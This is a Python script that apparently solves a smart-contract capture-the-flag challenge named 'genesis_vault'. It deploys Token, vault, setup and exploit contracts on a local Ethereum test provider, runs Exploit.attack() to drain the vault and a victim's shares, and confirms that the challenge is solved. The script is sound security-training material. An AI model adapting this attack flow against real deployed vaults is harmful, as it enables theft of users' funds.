import solcx
from web3 import Web3, EthereumTesterProvider

def main():
    print("[*] Initializing local EVM test provider...")
    w3 = Web3(EthereumTesterProvider())
    assert w3.is_connected()

    accounts = w3.eth.accounts
    deployer = accounts[0]
    player = accounts[1]

    print(f"[+] Deployer: {deployer}")
    print(f"[+] Player:   {player}")

    print("[*] Compiling contracts with solc 0.8.24...")
    compiled = solcx.compile_files(
        [
            "solutions/genesis_vault/Token.sol",
            "solutions/genesis_vault/GenesisVault.sol",
            "solutions/genesis_vault/Setup.sol",
            "solutions/genesis_vault/Exploit.sol"
        ],
        solc_version="0.8.24",
        output_values=["abi", "bin"]
    )

    setup_iface = compiled["solutions/genesis_vault/Setup.sol:Setup"]
    token_iface = compiled["solutions/genesis_vault/Token.sol:Token"]
    vault_iface = compiled["solutions/genesis_vault/GenesisVault.sol:GenesisVault"]
    exploit_iface = compiled["solutions/genesis_vault/Exploit.sol:Exploit"]

    # Deploy Setup contract passing player address
    print("[*] Deploying Setup contract...")
    SetupContract = w3.eth.contract(abi=setup_iface["abi"], bytecode=setup_iface["bin"])
    tx_hash = SetupContract.constructor(player).transact({"from": deployer})
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    setup_addr = receipt.contractAddress
    print(f"[+] Setup deployed at: {setup_addr}")

    setup = w3.eth.contract(address=setup_addr, abi=setup_iface["abi"])
    token_addr = setup.functions.token().call()
    vault_addr = setup.functions.vault().call()
    token = w3.eth.contract(address=token_addr, abi=token_iface["abi"])
    vault = w3.eth.contract(address=vault_addr, abi=vault_iface["abi"])

    print(f"[+] Token: {token_addr}")
    print(f"[+] Vault: {vault_addr}")
    print(f"[*] Initial isSolved(): {setup.functions.isSolved().call()}")
    print(f"[+] Initial Player Token balance: {w3.from_wei(token.functions.balanceOf(player).call(), 'ether')} gUSD")

    # Deploy Exploit contract
    print("\n[*] Deploying Exploit contract...")
    ExploitContract = w3.eth.contract(abi=exploit_iface["abi"], bytecode=exploit_iface["bin"])
    tx_hash = ExploitContract.constructor(setup_addr).transact({"from": player})
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    exploit_addr = receipt.contractAddress
    print(f"[+] Exploit deployed at: {exploit_addr}")

    # Approve Exploit
    print("[*] Player approves Exploit...")
    needed = w3.to_wei(100, "ether") + 1
    token.functions.approve(exploit_addr, needed).transact({"from": player})

    # Run Attack
    print("[*] Executing Exploit.attack() atomically...")
    exploit = w3.eth.contract(address=exploit_addr, abi=exploit_iface["abi"])
    exploit.functions.attack().transact({"from": player})

    # Verify results
    victim_addr = setup.functions.victim().call()
    print(f"\n[+] Results:")
    print(f"    Victim shares:             {vault.functions.balanceOf(victim_addr).call()}")
    print(f"    Vault remaining token:     {token.functions.balanceOf(vault_addr).call()}")
    final_balance = token.functions.balanceOf(player).call()
    print(f"    Player final Token balance: {w3.from_wei(final_balance, 'ether')} gUSD")

    solved = setup.functions.isSolved().call()
    print(f"\n[+] Setup.isSolved(): {solved}")
    assert solved, "Challenge not solved!"
    print("[SUCCESS] Atomic exploit verified successfully!")

if __name__ == "__main__":
    main()
